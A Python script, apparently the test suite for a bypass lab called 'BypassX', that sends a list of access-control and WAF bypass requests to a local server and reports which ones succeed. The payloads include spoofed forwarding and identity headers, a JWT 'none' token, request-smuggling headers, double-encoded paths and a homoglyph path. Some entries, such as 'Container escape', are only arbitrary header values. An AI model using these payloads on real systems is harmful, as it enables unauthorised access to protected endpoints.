#!/usr/bin/env python3
"""
Quick test script to validate bypass techniques
"""

import requests
import json
import time

LAB_URL = "http://127.0.0.1:5000"

def test_bypass(endpoint, headers=None, method="GET", data=None):
    """Test a specific bypass technique"""
    url = f"{LAB_URL}{endpoint}"
    try:
        if method == "POST":
            response = requests.post(url, headers=headers, json=data, timeout=5)
        else:
            response = requests.request(method, url, headers=headers, timeout=5)
        
        return {
            'url': url,
            'status': response.status_code,
            'success': response.status_code == 200,
            'response': response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text[:100]
        }
    except Exception as e:
        return {
            'url': url,
            'status': 0,
            'success': False,
            'error': str(e)
        }

def run_comprehensive_test():
    """Run comprehensive bypass tests"""
    print("BypassX Comprehensive Testing Suite")
    print("="*50)
    
    # Test cases: (name, endpoint, headers, method, data)
    test_cases = [
        # Basic bypasses
        ("Trailing slash", "/admin/", None, "GET", None),
        ("Trailing dot", "/admin/.", None, "GET", None),
        ("OPTIONS method", "/admin", None, "OPTIONS", None),
        ("X-HTTP-Method-Override", "/admin", {"X-HTTP-Method-Override": "GET"}, "POST", None),
        
        # Header manipulation
        ("X-Forwarded-For", "/admin", {"X-Forwarded-For": "127.0.0.1"}, "GET", None),
        ("Referer bypass", "/admin", {"Referer": "https://google.com"}, "GET", None),
        ("Googlebot UA", "/admin", {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"}, "GET", None),
        ("Host header", "/admin", {"Host": "localhost"}, "GET", None),
        ("Forwarded header", "/admin", {"Forwarded": "for=127.0.0.1;host=localhost"}, "GET", None),
        
        # Modern WAF bypasses
        ("Cloudflare IP", "/waf", {"CF-Connecting-IP": "127.0.0.1"}, "GET", None),
        ("Cache deception", "/waf", {"X-Forwarded-Host": "cdn.example.com"}, "GET", None),
        ("HTTP/2 authority", "/waf", {":authority": "internal.service"}, "GET", None),
        ("Request smuggling", "/waf", {"Transfer-Encoding": "chunked", "Content-Length": "0"}, "POST", None),
        
        # CDN bypasses
        ("Origin IP", "/cdn", {"X-Originating-IP": "1.2.3.4"}, "GET", None),
        ("Cache poisoning", "/cdn", {"X-Forwarded-Scheme": "internal"}, "GET", None),
        ("Edge location", "/cdn", {"X-Edge-Location": "edge-01"}, "GET", None),
        
        # API bypasses
        ("JWT none algorithm", "/api/v2/admin", {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0"}, "GET", None),
        ("API version downgrade", "/api/v2/admin", {"Accept": "application/vnd.api.v1+json"}, "GET", None),
        ("CORS preflight", "/api/v2/admin", {"Access-Control-Request-Method": "PUT"}, "OPTIONS", None),
        ("GraphQL introspection", "/api/v2/admin", {"Content-Type": "application/json"}, "POST", {"query": "query IntrospectionQuery { __schema { types { name } } }"}),
        
        # Container bypasses
        ("Istio bypass", "/microservice", {"X-Envoy-Original-Path": "/admin"}, "GET", None),
        ("K8s service account", "/microservice", {"X-Kubernetes-Service-Account": "system:serviceaccount:default:admin"}, "GET", None),
        ("Container escape", "/microservice", {"X-Container-Id": "docker-privileged-container-123"}, "GET", None),
        
        # ML evasion
        ("ML old browser", "/ml-protected", {"User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90)"}, "GET", None),
        ("ML timing attack", "/ml-protected", {"X-Timing-Attack": "slow"}, "GET", None),
        ("ML feature poisoning", "/ml-protected", {"Accept-Language": "xx-XX", "Accept-Encoding": "identity", "Connection": "close"}, "GET", None),
        
        # Advanced techniques
        ("Unicode bypass", "/advanced", None, "GET", None),  # Path contains unicode
        ("Double decode", "/advanced%252f", None, "GET", None),
        ("Path confusion", "/advanced/%2e", None, "GET", None),
    ]
    
    results = []
    successful_bypasses = 0
    
    for name, endpoint, headers, method, data in test_cases:
        print(f"Testing: {name:<25} ", end="")
        
        # Special handling for unicode test
        if name == "Unicode bypass":
            endpoint = "/advancеd"  # Contains Cyrillic 'е'
        
        result = test_bypass(endpoint, headers, method, data)
        results.append((name, result))
        
        if result['success']:
            successful_bypasses += 1
            print(f"✓ SUCCESS ({result['status']})")
        else:
            status = result.get('status', 'ERR')
            print(f"✗ FAILED ({status})")
        
        time.sleep(0.1)  # Small delay between requests
    
    # Get lab statistics
    try:
        stats_response = requests.get(f"{LAB_URL}/stats", timeout=5)
        lab_stats = stats_response.json() if stats_response.status_code == 200 else {}
    except:
        lab_stats = {}
    
    # Print summary
    print("\n" + "="*50)
    print("TEST SUMMARY")
    print("="*50)
    print(f"Total tests run: {len(test_cases)}")
    print(f"Successful bypasses: {successful_bypasses}")
    print(f"Success rate: {successful_bypasses/len(test_cases)*100:.1f}%")
    
    if lab_stats:
        print(f"Lab confirmed bypasses: {lab_stats.get('successful_bypasses', 0)}")
        print(f"Total lab requests: {lab_stats.get('total_attempts', 0)}")
    
    # Show failed tests
    failed_tests = [(name, result) for name, result in results if not result['success']]
    if failed_tests:
        print(f"\nFailed tests ({len(failed_tests)}):")
        for name, result in failed_tests:
            status = result.get('status', 'unknown')
            error_msg = result.get('error', f"Status {status}")
            print(f"  - {name}: {error_msg}")
    
    # Show successful techniques
    successful_tests = [(name, result) for name, result in results if result['success']]
    if successful_tests:
        print(f"\nSuccessful bypasses ({len(successful_tests)}):")
        for name, result in successful_tests:
            print(f"  ✓ {name}")
    
    return {
        'total_tests': len(test_cases),
        'successful_bypasses': successful_bypasses,
        'success_rate': successful_bypasses/len(test_cases)*100,
        'lab_stats': lab_stats,
        'results': results
    }

if __name__ == "__main__":
    run_comprehensive_test()